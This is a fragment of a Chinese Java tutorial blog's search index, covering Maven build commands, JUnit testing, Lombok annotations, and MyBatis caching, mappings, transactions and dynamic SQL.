\u003cversion\u003e5.8.1\u003c/version\u003e \u003cscope\u003etest\u003c/scope\u003e \u003c/dependency\u003e \u003c/dependencies\u003e \u003cdependencyManagement\u003e \u003cdependencies\u003e ... ","date":"2024-04-07","objectID":"/articles/2024/04/maven/:1:6","tags":["Java","Maven","JavaEE"],"title":"使用Maven管理项目","uri":"/articles/2024/04/maven/"},{"categories":["Java"],"content":"Maven常用命令 我们可以看到在IDEA右上角Maven板块中，每个Maven项目都有一个生命周期，实际上这些是Maven的一些插件，每个插件都有各自的功能，比如： clean命令，执行后会清理整个target文件夹，在之后编写Springboot项目时可以解决一些缓存没更新的问题。 validate命令可以验证项目的可用性。 compile命令可以将项目编译为.class文件。 install命令可以将当前项目安装到本地仓库，以供其他项目导入作为依赖使用 verify命令可以按顺序执行每个默认生命周期阶段（validate，compile，package等） ","date":"2024-04-07","objectID":"/articles/2024/04/maven/:1:7","tags":["Java","Maven","JavaEE"],"title":"使用Maven管理项目","uri":"/articles/2024/04/maven/"},{"categories":["Java"],"content":"Maven测试项目 通过使用test命令，可以一键测试所有位于test目录下的测试案例，请注意有以下要求： 测试类的名称必须是以Test结尾，比如MainTest 测试方法上必须标注@Test注解，实测@RepeatedTest无效 这是由于JUnit5比较新，我们需要重新配置插件升级到高版本，才能完美的兼容Junit5： \u003cbuild\u003e \u003cplugins\u003e \u003cplugin\u003e \u003cgroupId\u003eorg.apache.maven.plugins\u003c/groupId\u003e \u003cartifactId\u003emaven-surefire-plugin\u003c/artifactId\u003e \u003c!-- JUnit 5 requires Surefire version 2.22.0 or higher --\u003e \u003cversion\u003e2.22.0\u003c/version\u003e \u003c/plugin\u003e \u003c/plugins\u003e \u003c/build\u003e 现在@RepeatedTest、@BeforeAll也能使用了。 ","date":"2024-04-07","objectID":"/articles/2024/04/maven/:1:8","tags":["Java","Maven","JavaEE"],"title":"使用Maven管理项目","uri":"/articles/2024/04/maven/"},{"categories":["Java"],"content":"Maven打包项目 我们的项目在编写完成之后，要么作为Jar依赖，供其他模型使用，要么就作为一个可以执行的程序，在控制台运行，我们只需要直接执行package命令就可以直接对项目的代码进行打包，生成jar文件。 当然，以上方式仅适用于作为Jar依赖的情况，如果我们需要打包一个可执行文件，那么我不仅需要将自己编写的类打包到Jar中，同时还需要将依赖也一并打包到Jar中，因为我们使用了别人为我们通过的框架，自然也需要运行别人的代码，我们需要使用另一个插件来实现一起打包： \u003cplugin\u003e \u003cartifactId\u003emaven-assembly-plugin\u003c/artifactId\u003e \u003cversion\u003e3.1.0\u003c/version\u003e \u003cconfiguration\u003e \u003cdescriptorRefs\u003e \u003cdescriptorRef\u003ejar-with-dependencies\u003c/descriptorRef\u003e \u003c/descriptorRefs\u003e \u003carchive\u003e \u003cmanifest\u003e \u003caddClasspath\u003etrue\u003c/addClasspath\u003e \u003cmainClass\u003ecom.test.Main\u003c/mainClass\u003e \u003c/manifest\u003e \u003c/archive\u003e \u003c/configuration\u003e \u003cexecutions\u003e \u003cexecution\u003e \u003cid\u003emake-assembly\u003c/id\u003e \u003cphase\u003epackage\u003c/phase\u003e \u003cgoals\u003e \u003cgoal\u003esingle\u003c/goal\u003e \u003c/goals\u003e \u003c/execution\u003e \u003c/executions\u003e \u003c/plugin\u003e 在打包之前也会执行一次test命令，来保证项目能够正常运行，当测试出现问题时，打包将无法完成，我们也可以手动跳过，选择执行Maven目标来手动执行Maven命令，输入mvn package -Dmaven.test.skip=true 来以跳过测试的方式进行打包。 最后得到我们的Jar文件，在同级目录下输入java -jar xxxx.jar来运行我们打包好的Jar可执行程序（xxx代表文件名称） deploy命令用于发布项目到本地仓库和远程仓库，一般情况下用不到，这里就不做讲解了。 site命令用于生成当前项目的发布站点，暂时不需要了解。 我们之前还讲解了多模块项目，那么多模块下父项目存在一个packing打包类型标签，所有的父级项目的packing都为pom，packing默认是jar类型，如果不作配置，maven会将该项目打成jar包。作为父级项目，还有一个重要的属性，那就是modules，通过modules标签将项目的所有子项目引用进来，在build父级项目时，会根据子模块的相互依赖关系整理一个build顺序，然后依次build。 ","date":"2024-04-07","objectID":"/articles/2024/04/maven/:1:9","tags":["Java","Maven","JavaEE"],"title":"使用Maven管理项目","uri":"/articles/2024/04/maven/"},{"categories":["Java"],"content":"使用JUnit进行单元测试 首先一问：我们为什么需要单元测试？ 随着我们的项目逐渐变大，比如我们之前编写的图书管理系统，我们都是边在写边在测试，而我们当时使用的测试方法，就是直接在主方法中运行测试，但是，在很多情况下，我们的项目可能会很庞大，不可能每次都去完整地启动一个项目来测试某一个功能，这样显然会降低我们的开发效率，因此，我们需要使用单元测试来帮助我们针对于某个功能或是某个模块单独运行代码进行测试，而不是启动整个项目。 同时，在我们项目的维护过程中，难免会涉及到一些原有代码的修改，很有可能出现改了代码导致之前的功能出现问题（牵一发而动全身），而我们又不一定能立即察觉到，因此，我们可以提前保存一些测试用例，每次完成代码后都可以跑一遍测试用例，来确保之前的功能没有因为后续的修改而出现问题。 我们还可以利用单元测试来评估某个模块或是功能的耗时和性能，快速排查导致程序运行缓慢的问题，这些都可以通过单元测试来完成，可见单元测试对于开发的重要性。 ","date":"2024-03-31","objectID":"/articles/2024/03/junit/:1:0","tags":["Java","Junit","JavaEE"],"title":"Junit","uri":"/articles/2024/03/junit/"},{"categories":["Java"],"content":"尝试JUnit 首先需要导入JUnit依赖，我们在这里使用Junit4进行介绍，最新的Junit5放到Maven板块一起讲解，Jar包已经放在视频下方简介中，直接去下载即可。同时IDEA需要安装JUnit插件（默认是已经捆绑安装的，因此无需多余配置） 现在我们创建一个新的类，来编写我们的单元测试用例： public class TestMain { @Test public void method(){ System.out.println(\"我是测试用例1\"); } @Test public void method2(){ System.out.println(\"我是测试用例2\"); } } 我们可以点击类前面的测试按钮，或是单个方法前的测试按钮，如果点击类前面的测试按钮，会执行所有的测试用例。 运行测试后，我们发现控制台得到了一个测试结果，显示为绿色表示测试通过。 只需要通过打上@Test注解，即可将一个方法标记为测试案例，我们可以直接运行此测试案例，但是我们编写的测试方法有以下要求： 方法必须是public的 不能是静态方法 返回值必须是void 必须是没有任何参数的方法 对于一个测试案例来说，我们肯定希望测试的结果是我们所期望的一个值，因此，如果测试的结果并不是我们所期望的结果，那么这个测试就应该没有成功通过！ 我们可以通过断言工具类来进行判定： public class TestMain { @Test public void method(){ System.out.println(\"我是测试案例！\"); Assert.assertEquals(1, 2); //参数1是期盼值，参数2是实际测试结果值 } } 通过运行代码后，我们发现测试过程中抛出了一个错误，并且IDEA给我们显示了期盼结果和测试结果，那么现在我们来测试一个案例，比如我们想查看冒泡排序的编写是否正确： @Test public void method(){ int[] arr = {0, 4, 5, 2, 6, 9, 3, 1, 7, 8}; //错误的冒泡排序 for (int i = 0; i \u003c arr.length - 1; i++) { for (int j = 0; j \u003c arr.length - 1 - i; j++) { if(arr[j] \u003e arr[j + 1]){ int tmp = arr[j]; arr[j] = arr[j+1]; // arr[j+1] = tmp; } } } Assert.assertArrayEquals(new int[]{0, 1, 2, 3, 4, 5, 6, 7, 8, 9}, arr); } 通过测试，我们发现得到的结果并不是我们想要的结果，因此现在我们需要去修改为正确的冒泡排序，修改后，测试就能正确通过了。我们还可以再通过一个案例来更加深入地了解测试，现在我们想测试从数据库中取数据是否为我们预期的数据： @Test public void method(){ try (SqlSession sqlSession = MybatisUtil.getSession(true)){ TestMapper mapper = sqlSession.getMapper(TestMapper.class); Student student = mapper.getStudentBySidAndSex(1, \"男\"); Assert.assertEquals(new Student().setName(\"小明\").setSex(\"男\").setSid(1), student); } } 那么如果我们在进行所有的测试之前需要做一些前置操作该怎么办呢，一种办法是在所有的测试用例前面都加上前置操作，但是这样显然是很冗余的，因为一旦发生修改就需要挨个进行修改，因此我们需要更加智能的方法，我们可以通过@Before注解来添加测试用例开始之前的前置操作： public class TestMain { private SqlSessionFactory sqlSessionFactory; @Before public void before(){ System.out.println(\"测试前置正在初始化...\"); try { sqlSessionFactory = new SqlSessionFactoryBuilder() .build(new FileInputStream(\"mybatis-config.xml\")); } catch (FileNotFoundException e) { e.printStackTrace(); } System.out.println(\"测试初始化完成，正在开始测试案例...\"); } @Test public void method1(){ try (SqlSession sqlSession = sqlSessionFactory.openSession(true)){ TestMapper mapper = sqlSession.getMapper(TestMapper.class); Student student = mapper.getStudentBySidAndSex(1, \"男\"); Assert.assertEquals(new Student().setName(\"小明\").setSex(\"男\").setSid(1), student); System.out.println(\"测试用例1通过！\"); } } @Test public void method2(){ try (SqlSession sqlSession = sqlSessionFactory.openSession(true)){ TestMapper mapper = sqlSession.getMapper(TestMapper.class); Student student = mapper.getStudentBySidAndSex(2, \"女\"); Assert.assertEquals(new Student().setName(\"小红\").setSex(\"女\").setSid(2), student); System.out.println(\"测试用例2通过！\"); } } } 同理，在所有的测试完成之后，我们还想添加一个收尾的动作，那么只需要使用@After注解即可添加结束动作： @After public void after(){ System.out.println(\"测试结束，收尾工作正在进行...\"); } ","date":"2024-03-31","objectID":"/articles/2024/03/junit/:1:1","tags":["Java","Junit","JavaEE"],"title":"Junit","uri":"/articles/2024/03/junit/"},{"categories":["Java"],"content":"使用Lombok 我们发现，在以往编写项目时，尤其是在类进行类内部成员字段封装时，需要编写大量的get/set方法，这不仅使得我们类定义中充满了get和set方法，同时如果字段名称发生改变，又要挨个进行修改，甚至当字段变得很多时，构造方法的编写会非常麻烦！ 通过使用Lombok（小辣椒）就可以解决这样的问题！ 我们来看看，使用原生方式和小辣椒方式编写类的区别，首先是传统方式： public class Student { private Integer sid; private String name; private String sex; public Student(Integer sid, String name, String sex) { this.sid = sid; this.name = name; this.sex = sex; } public Integer getSid() { //长！ return sid; } public void setSid(Integer sid) { //到！ this.sid = sid; } public String getName() { //爆！ return name; } public void setName(String name) { //炸！ this.name = name; } public String getSex() { return sex; } public void setSex(String sex) { this.sex = sex; } } 而使用Lombok之后： @Getter @Setter @AllArgsConstructor public class Student { private Integer sid; private String name; private String sex; } 我们发现，使用Lombok之后，只需要添加几个注解，就能够解决掉我们之前长长的一串代码！ ","date":"2024-03-31","objectID":"/articles/2024/03/lombok/:1:0","tags":["Java","Lombok","JavaEE"],"title":"Lombok","uri":"/articles/2024/03/lombok/"},{"categories":["Java"],"content":"配置Lombok 首先我们需要导入Lombok的jar依赖，和jdbc依赖是一样的，放在项目目录下直接导入就行了。可以在这里进行下载：https://projectlombok.org/download 然后我们要安装一下Lombok插件，由于IDEA默认都安装了Lombok的插件，因此直接导入依赖后就可以使用了。 重启IDEA Lombok是一种插件化注解API，是通过添加注解来实现的，然后在javac进行编译的时候，进行处理。 Java的编译过程可以分成三个阶段： 所有源文件会被解析成语法树。 调用注解处理器。如果注解处理器产生了新的源文件，新文件也要进行编译。 最后，语法树会被分析并转化成类文件。 实际上在上述的第二阶段，会执行*lombok.core.AnnotationProcessor*，它所做的工作就是我们上面所说的，修改语法树。 ","date":"2024-03-31","objectID":"/articles/2024/03/lombok/:1:1","tags":["Java","Lombok","JavaEE"],"title":"Lombok","uri":"/articles/2024/03/lombok/"},{"categories":["Java"],"content":"使用Lombok 我们通过实战来演示一下Lombok的实用注解： 我们通过添加@Getter和@Setter来为当前类的所有字段生成get/set方法，他们可以添加到类或是字段上，注意静态字段不会生成，final字段无法生成set方法。 我们还可以使用@Accessors来控制生成Getter和Setter的样式。 我们通过添加@ToString来为当前类生成预设的toString方法。 我们可以通过添加@EqualsAndHashCode来快速生成比较和哈希值方法。 我们可以通过添加@AllArgsConstructor和@NoArgsConstructor来快速生成全参构造和无参构造。 我们可以添加@RequiredArgsConstructor来快速生成参数只包含final或被标记为@NonNull的成员字段。 使用@Data能代表@Setter、@Getter、@RequiredArgsConstructor、@ToString、@EqualsAndHashCode全部注解。 一旦使用@Data就不建议此类有继承关系，因为equal方法可能不符合预期结果（尤其是仅比较子类属性）。 使用@Value与@Data类似，但是并不会生成setter并且成员属性都是final的。 使用@SneakyThrows来自动生成try-catch代码块。 使用@Cleanup作用与局部变量，在最后自动调用其close()方法（可以自由更换） 使用@Builder来快速生成建造者模式。 通过使用@Builder.Default来指定默认值。 通过使用@Builder.ObtainVia来指定默认值的获取方式。 ","date":"2024-03-31","objectID":"/articles/2024/03/lombok/:1:2","tags":["Java","Lombok","JavaEE"],"title":"Lombok","uri":"/articles/2024/03/lombok/"},{"categories":["Java"],"content":"使用注解开发 Mybatis支持直接在方法上使用注解添加SQL语句从而完成数据库和对象的映射。使用XML进行映射器编写时，需要现在XML中定义映射规则和SQL语句，然后再将其绑定到一个接口的方法定义上，然后再使用接口来执行： 于是就从原来的XML方式 \u003cinsert id=\"addStudent\"\u003e insert into student(id, name, sex) values (#{id}, #{name}, #{sex}) \u003c/insert\u003e 转变为了现在的注解方式 @Insert(\"insert into student(id, name, sex) values (#{id}, #{name}, #{sex})\") int addStudent(Student student); 这个看起来就非常简洁明了了。其他的增删改查的标签在Mybatis中均有注解替代： @Select(\"select * from student where id = #{sid}\") Student getStudentBySid(int sid); Java中的注解可以使用反射机制获取到添加注解的方法或者类，因此无需再添加id进行绑定 在使用之前，需要将mybatis-config.xml中关于mapper的地址改为类： \u003cmappers\u003e \u003cmapper class=\"com.mappers.TestMapper\"/\u003e \u003c/mappers\u003e 当然，如果一个软件包下面有很多个mapper，可以使用package属性将其一次性全部导入： \u003cmappers\u003e \u003cpackage name=\"com.test.mapper\"/\u003e \u003c/mappers\u003e 为了实现自定义映射，可以使用@Results和@Result注解实现一一映射： @Results({ @Result(id = true, column = \"id\", property = \"id\"), @Result(column = \"name\", property = \"name\"), @Result(column = \"id\", property = \"studentList\", many = @Many(select = \"getStudentByTid\") ) }) @Select(\"select * from teacher where id = #{tid}\") Teacher getTeacherByTid(int tid); 在@Select注解上添加@Results注解，并在其中添加多个@Result成员来实现注解的一一对应的映射。 这里的@Many也是一种注解，它将使用select中指定的属性完成一对多的查询。同理，@One可以实现多对一的查询。 在以上内容中，对id和name的映射规则是不必要的，Mybatis可以自动根据类的成员来进行映射。但是studentList属性是必须要自定义映射的，Mybatis无法自动的完成这个映射。 同时，Mybatis也支持在注解中读取xml文件中的内容。例如，在注解中编写SQL语句，但是使用在XML文件中定义的ResultMap。 @ResultMap(\"test\") @Select(\"select * from student\") List\u003cStudent\u003e getAllStudent(); 当类中没有构造函数可以构造全部参数的时候，可以使用@ConstructorArgs注解来指定构造方法： @ConstructorArgs({ @Arg(column = \"sid\", javaType = int.class), @Arg(column = \"name\", javaType = String.class) }) @Select(\"select * from student where sid = #{sid} and sex = #{sex}\") Student getStudentBySidAndSex(@Param(\"sid\") int sid, @Param(\"sex\") String sex); 当然，这里也可能出现在一个SQL语句中有多个参数的时候可以使用@Param注解来表示 这里还有一种特殊的情况，如果方法中有一个参数是对象类型，那么即使@Param也无法解决这个问题。此时可以更改SQL语句中的选项： @Insert(\"insert into student(sid, name, sex) values(#{sid}, #{name}, #{sex})\") int addStudent(@Param(\"sid\") int sid, @Param(\"student\") Student student); ","date":"2024-03-29","objectID":"/articles/2024/03/mybatis-5/:1:0","tags":["Java","Mybatis","JavaEE"],"title":"使用Mybatis的注解系统","uri":"/articles/2024/03/mybatis-5/"},{"categories":["Java"],"content":"使用注解开启缓存 那么如何通过注解控制缓存机制呢？ @CacheNamespace(readWrite = false) public interface MyMapper { @Select(\"select * from student\") @Options(useCache = false) List\u003cStudent\u003e getAllStudent(); 使用@CacheNamespace注解直接定义在接口上即可，然后我们可以通过使用@Options来控制单个操作的缓存启用。 在项目中的配置尽量还是使用注解 ","date":"2024-03-29","objectID":"/articles/2024/03/mybatis-5/:2:0","tags":["Java","Mybatis","JavaEE"],"title":"使用Mybatis的注解系统","uri":"/articles/2024/03/mybatis-5/"},{"categories":["Java"],"content":"Mybatis缓存机制 MyBatis 内置了一个强大的事务性查询缓存机制，它可以非常方便地配置和定制。 其实缓存机制我们在之前学习IO流的时候已经提及过了，我们可以提前将一部分内容放入缓存，下次需要获取数据时，我们就可以直接从缓存中读取，这样的话相当于直接从内存中获取而不是再去向数据库索要数据，效率会更高。 因此Mybatis内置了一个缓存机制，我们查询时，如果缓存中存在数据，那么我们就可以直接从缓存中获取，而不是再去向数据库进行请求。 Mybatis存在一级缓存和二级缓存，我们首先来看一下一级缓存，默认情况下，只启用了本地的会话缓存，它仅仅对一个会话中的数据进行缓存（一级缓存无法关闭，只能调整），我们来看看下面这段代码： public static void main(String[] args) throws InterruptedException { try (SqlSession sqlSession = MybatisUtil.getSession(true)){ TestMapper testMapper = sqlSession.getMapper(TestMapper.class); Student student1 = testMapper.getStudentBySid(1); Student student2 = testMapper.getStudentBySid(1); System.out.println(student1 == student2); } } 我们发现，两次得到的是同一个Student对象，也就是说我们第二次查询并没有重新去构造对象，而是直接得到之前创建好的对象。如果还不是很明显，我们可以修改一下实体类： @Data @Accessors(chain = true) public class Student { public Student(){ System.out.println(\"我被构造了\"); } private int sid; private String name; private String sex; } 我们通过前面的学习得知Mybatis在映射为对象时，在只有一个构造方法的情况下，无论你构造方法写成什么样子，都会去调用一次构造方法，如果存在多个构造方法，那么就会去找匹配的构造方法。我们可以通过查看构造方法来验证对象被创建了几次。 结果显而易见，只创建了一次，也就是说当第二次进行同样的查询时，会直接使用第一次的结果，因为第一次的结果已经被缓存了。 那么如果我修改了数据库中的内容，缓存还会生效吗： public static void main(String[] args) throws InterruptedException { try (SqlSession sqlSession = MybatisUtil.getSession(true)){ TestMapper testMapper = sqlSession.getMapper(TestMapper.class); Student student1 = testMapper.getStudentBySid(1); testMapper.addStudent(new Student().setName(\"小李\").setSex(\"男\")); Student student2 = testMapper.getStudentBySid(1); System.out.println(student1 == student2); } } 我们发现，当我们进行了插入操作后，缓存就没有生效了，我们再次进行查询得到的是一个新创建的对象。 也就是说，一级缓存，在进行DML操作后，会使得缓存失效，也就是说Mybatis知道我们对数据库里面的数据进行了修改，所以之前缓存的内容可能就不是当前数据库里面最新的内容了。还有一种情况就是，当前会话结束后，也会清理全部的缓存，因为已经不会再用到了。但是一定注意，一级缓存只针对于单个会话，多个会话之间不相通。 public static void main(String[] args) { try (SqlSession sqlSession = MybatisUtil.getSession(true)){ TestMapper testMapper = sqlSession.getMapper(TestMapper.class); Student student2; try(SqlSession sqlSession2 = MybatisUtil.getSession(true)){ TestMapper testMapper2 = sqlSession2.getMapper(TestMapper.class); student2 = testMapper2.getStudentBySid(1); } Student student1 = testMapper.getStudentBySid(1); System.out.println(student1 == student2); } } 注意： 一个会话DML操作只会重置当前会话的缓存，不会重置其他会话的缓存，也就是说，其他会话缓存是不会更新的！ 一级缓存给我们提供了很高速的访问效率，但是它的作用范围实在是有限，如果一个会话结束，那么之前的缓存就全部失效了，但是我们希望缓存能够扩展到所有会话都能使用，因此我们可以通过二级缓存来实现，二级缓存默认是关闭状态，要开启二级缓存，我们需要在映射器XML文件中添加： \u003ccache/\u003e 可见二级缓存是Mapper级别的，也就是说，当一个会话失效时，它的缓存依然会存在于二级缓存中，因此如果我们再次创建一个新的会话会直接使用之前的缓存，我们首先根据官方文档进行一些配置： \u003ccache eviction=\"FIFO\" flushInterval=\"60000\" size=\"512\" readOnly=\"true\"/\u003e 我们来编写一个代码： public static void main(String[] args) { Student student; try (SqlSession sqlSession = MybatisUtil.getSession(true)){ TestMapper testMapper = sqlSession.getMapper(TestMapper.class); student = testMapper.getStudentBySid(1); } try (SqlSession sqlSession2 = MybatisUtil.getSession(true)){ TestMapper testMapper2 = sqlSession2.getMapper(TestMapper.class); Student student2 = testMapper2.getStudentBySid(1); System.out.println(student2 == student); } } 我们可以看到，上面的代码中首先是第一个会话在进行读操作，完成后会结束会话，而第二个操作重新创建了一个新的会话，再次执行了同样的查询，我们发现得到的依然是缓存的结果。 那么如果我不希望某个方法开启缓存呢？我们可以添加useCache属性来关闭缓存： \u003cselect id=\"getStudentBySid\" resultType=\"Student\" useCache=\"false\"\u003e select * from student where sid = #{sid} \u003c/select\u003e 我们也可以使用flushCache=“false\"在每次执行后都清空缓存，通过这这个我们还可以控制DML操作完成之后不清空缓存。 \u003cselect id=\"getStudentBySid\" resultType=\"Student\" flushCache=\"true\"\u003e select * from student where sid = #{sid} \u003c/select\u003e 添加了二级缓存之后，会先从二级缓存中查找数据，当二级缓存中没有时，才会从一级缓存中获取，当一级缓存中都还没有数据时，才会请求数据库，因此我们再来执行上面的代码： public static void main(String[] args) { try (SqlSession sqlSession = MybatisUtil.getSession(true)){ TestMapper testMapper = sqlSession.getMapper(TestMapper.class); Student student2; try(SqlSession sqlSession2 = MybatisUtil.getSession(true)){ TestMapper testMapper2 = sqlSession2.getMapper(TestMapper.class); student2 = testMapper2.getStudentBySid(1); } Student student1 = testMapper.getStudentBySid(1); System.out.println(student1 == student2); } } 得到的结果就会是同一个对象了，因为现在是优先从二级缓存中获取。 读取顺序：二级缓存 =\u003e 一级缓存 =\u003e 数据库 虽然缓存","date":"2024-03-29","objectID":"/articles/2024/03/mybatis-4/:1:0","tags":["Java","Mybatis","JavaEE"],"title":"Mybatis的缓存机制","uri":"/articles/2024/03/mybatis-4/"},{"categories":["Java"],"content":"Mybatis进行复杂查询 要将一个查询映射为一个具有多个复杂属性的类对象的时候，建议使用resultMap将数据库的字段和类的属性进行手动的对应。例如我们要查询下面的内容以便收集对应老师和学生的信息： select student.id, student.name, student.sex, teacher.id, teacher.name from student inner join teach on teach.sid = student.id inner join teacher on teach.tid = teacher.id where teacher.id = 11238 而我们Teacher类的定义如下： @Data public class Teacher { int id; String name; List\u003cStudent\u003e studentList; } 于是我们可以使用以下的resultMap将其和数据表对应起来： \u003cselect id=\"selectTeacherById\" resultMap=\"getTeacher\"\u003e select student.id as sid, student.name as sname, student.sex, teacher.id as tid, teacher.name as tname from student inner join teach on teach.sid = student.id inner join teacher on teach.tid = teacher.id where teacher.id = #{id} \u003c/select\u003e \u003cresultMap id=\"getTeacher\" type=\"com.entity.Teacher\"\u003e \u003cid column=\"tid\" property=\"id\"/\u003e \u003cresult column=\"tname\" property=\"name\"/\u003e \u003ccollection property=\"studentList\" ofType=\"com.entity.Student\"\u003e \u003cid column=\"sid\" property=\"id\"/\u003e \u003cresult column=\"sname\" property=\"name\"/\u003e \u003cresult column=\"sex\" property=\"sex\"/\u003e \u003c/collection\u003e \u003c/resultMap\u003e 对一些配置内容做出解释： constructor - 用于在实例化类时，注入结果到构造方法中、 idArg - ID 参数；标记出作为 ID 的结果可以帮助提高整体性能 arg - 将被注入到构造方法的一个普通结果 id – 一个 ID 结果；标记出作为 ID 的结果可以帮助提高整体性能 result – 注入到字段或 JavaBean 属性的普通结果 association – 一个复杂类型的关联；许多结果将包装成这种类型 嵌套结果映射 – 关联可以是 resultMap 元素，或是对其它结果映射的引用 collection – 一个复杂类型的集合 嵌套结果映射 – 集合可以是 resultMap 元素，或是对其它结果映射的引用 discriminator – 使用结果值来决定使用哪个resultMap case – 基于某些值的结果映射 嵌套结果映射 – case 也是一个结果映射，因此具有相同的结构和元素；或者引用其它的结果映射 id \u0026 result: 这些元素是结果映射的基础。id 和 result 元素都将一个列的值映射到一个简单数据类型（String, int, double, Date 等）的属性或字段。这两者之间的唯一不同是，id 元素对应的属性会被标记为对象的标识符，在比较对象实例时使用。 这样可以提高整体的性能，尤其是进行缓存和嵌套结果映射（也就是连接映射）的时候。 注意在使用resultMap进行映射的时候，尽量不要定义额外的构造函数。 了解了一对多，那么多对一又该如何查询呢，比如每个学生都有一个对应的老师，现在Student新增了一个Teacher对象，那么现在又该如何去处理呢？ @Data @Accessors(chain = true) public class Student { private int sid; private String name; private String sex; private Teacher teacher; } @Data public class Teacher { int tid; String name; } 现在我们希望的是，每次查询到一个Student对象时都带上它的老师，同样的，我们也可以使用resultMap来实现（先修改一下老师的类定义，不然会很麻烦）： \u003cresultMap id=\"test2\" type=\"Student\"\u003e \u003cid column=\"sid\" property=\"sid\"/\u003e \u003cresult column=\"name\" property=\"name\"/\u003e \u003cresult column=\"sex\" property=\"sex\"/\u003e \u003cassociation property=\"teacher\" javaType=\"Teacher\"\u003e \u003cid column=\"tid\" property=\"tid\"/\u003e \u003cresult column=\"tname\" property=\"name\"/\u003e \u003c/association\u003e \u003c/resultMap\u003e \u003cselect id=\"selectStudent\" resultMap=\"test2\"\u003e select *, teacher.name as tname from student left join teach on student.sid = teach.sid left join teacher on teach.tid = teacher.tid \u003c/select\u003e 通过使用association进行关联，形成多对一的关系，实际上和一对多是同理的，都是对查询结果的一种处理方式罢了。 更多关于结果映射的文档参考：https://mybatis.org/mybatis-3/zh_CN/sqlmap-xml.html ","date":"2024-03-29","objectID":"/articles/2024/03/mybatis-3/:1:0","tags":["Java","Mybatis","JavaEE"],"title":"使用Mybatis进行复杂查询","uri":"/articles/2024/03/mybatis-3/"},{"categories":["Java"],"content":"事务操作 可以在获取SqlSession关闭自动提交来开启事务模式，和JDBC其实都差不多： public static void main(String[] args) { try (SqlSession sqlSession = MybatisUtil.getSession(false)){ TestMapper testMapper = sqlSession.getMapper(TestMapper.class); testMapper.addStudent(new Student().setSex(\"男\").setName(\"小王\")); testMapper.selectStudent().forEach(System.out::println); } } 在关闭自动提交后内容是没有进入到数据库的，只有提交事务后才能将相应的改变写入数据库： sqlSession.commit(); 同理，可以通过回滚操作让commit()之前的操作全部取消。 try (SqlSession sqlSession = MybatisUtil.getSession(false)){ TestMapper testMapper = sqlSession.getMapper(TestMapper.class); testMapper.addStudent(new Student().setSex(\"男\").setName(\"小王\")); testMapper.selectStudent().forEach(System.out::println); sqlSession.rollback(); sqlSession.commit(); } ","date":"2024-03-29","objectID":"/articles/2024/03/mybatis-3/:2:0","tags":["Java","Mybatis","JavaEE"],"title":"使用Mybatis进行复杂查询","uri":"/articles/2024/03/mybatis-3/"},{"categories":["Java"],"content":"动态SQL 官方文档：https://mybatis.org/mybatis-3/zh_CN/dynamic-sql.html 在XML配置中，可以配置当满足某个条件的时候增加某个SQL条件，此时就可以使用动态SQL的语法。 \u003cselect id=\"selectStudentById\" resultType=\"com.entity.Student\"\u003e select * from student where id = #{id} \u003cif test=\"sid % 2 == 0\"\u003e and sex = '男' \u003c/if\u003e \u003c/select\u003e 在添加以上标签后，当sid为偶数的时候，只能查到男生的信息。 test属性的语句是Java语句 同时，还有很多动态标签的例子，例如： \u003cselect id=\"findActiveBlogLike\" resultType=\"Blog\"\u003e SELECT * FROM BLOG WHERE state = ‘ACTIVE’ \u003cchoose\u003e \u003cwhen test=\"title != null\"\u003e AND title like #{title} \u003c/when\u003e \u003cwhen test=\"author != null and author.name != null\"\u003e AND author_name like #{author.name} \u003c/when\u003e \u003cotherwise\u003e AND featured = 1 \u003c/otherwise\u003e \u003c/choose\u003e \u003c/select\u003e \u003cwhen\u003e和\u003cchoose\u003e标签就非常像Java中的switch和case的组合。 ","date":"2024-03-29","objectID":"/articles/2024/03/mybatis-3/:3:0","tags":["Java","Mybatis","JavaEE"],"title":"使用Mybatis进行复杂查询","uri":"/articles/2024/03/mybatis-3/"},{"categories":["Java"],"content":"使用Mybatis进行增删查改 如果在返回类型不喜欢实体类，同样可以将resultType改为Map： \u003cselect id=\"selectStudent\" resultType=\"Map\"\u003e select * from student \u003c/select\u003e public interface TestMapper { List\u003cMap\u003e selectStudent(); } 在默认的实体类映射中，类中的字段和数据库中的字段必须保持一致。如果不想保持一致可以使用以下方法进行对应： \u003cresultMap id=\"Test\" type=\"Student\"\u003e \u003cresult column=\"sid\" property=\"sid\"/\u003e \u003cresult column=\"sex\" property=\"name\"/\u003e \u003cresult column=\"name\" property=\"sex\"/\u003e \u003c/resultMap\u003e 当类中有多个构造函数的时候，需要指定使用何种constructor来进行对象的构造： \u003cresultMap id=\"test\" type=\"Student\"\u003e \u003cconstructor\u003e \u003carg column=\"sid\" javaType=\"Integer\"/\u003e \u003carg column=\"name\" javaType=\"String\"/\u003e \u003c/constructor\u003e \u003c/resultMap\u003e ","date":"2024-03-28","objectID":"/articles/2024/03/mybatis-2/:1:0","tags":["Java","Mybatis","JavaEE"],"title":"使用Mybatis进行增删改查","uri":"/articles/2024/03/mybatis-2/"},{"categories":["Java"],"content":"条件查询 只需要在原来的select块中新增parameterType即可（好像不加也可以）。然后在需要查询的条件上加入#{}即可。 我们通过使用#{xxx}或是${xxx}来填入我们给定的属性，实际上Mybatis本质也是通过PreparedStatement首先进行一次预编译，有效地防止SQL注入问题，但是如果使用${xxx}就不再是通过预编译，而是直接传值，因此我们一般都使用#{xxx}来进行操作。 \u003cselect id=\"selectStudentById\" resultType=\"com.entity.Student\"\u003e select * from student where id = #{id} \u003c/select\u003e 同时在接口中新增方法，不再需要放在List里面，直接返回实体类即可。这里注意要在方法中加入参数。 Student selectStudentById(int id); 此时在原来getMapper的基础上使用testMapper.selectStudentById(id)方法即可进行条件查询 TestMapper testMapper = session.getMapper(TestMapper.class); testMapper.selectStudent().forEach(System.out::println); System.out.println(\"Searching id with 235297...\"); System.out.println(testMapper.selectStudentById(235297)); ","date":"2024-03-28","objectID":"/articles/2024/03/mybatis-2/:1:1","tags":["Java","Mybatis","JavaEE"],"title":"使用Mybatis进行增删改查","uri":"/articles/2024/03/mybatis-2/"},{"categories":["Java"],"content":"插入数据 同样的道理，使用\u003cinsert\u003e标签进行数据的插入： \u003cinsert id=\"addStudent\"\u003e insert student(id, name, sex) value(#{id}, #{name}, #{sex}) \u003c/insert\u003e 由于不需要返回对象，这里不用写任何的返回值类型。但是注意这里同样会返回一个int值。 然后在接口中定义一个和id相同的方法，调用即可。 int addStudent(@Param(\"id\") int id, @Param(\"name\") String name, @Param(\"sex\") String sex); System.out.println(\"Insert new student...\"); Student tmp = new Student(235299,\"小刚\", \"男\"); System.out.println(testMapper.addStudent(tmp.getId(), tmp.getName(), tmp.getSex())); 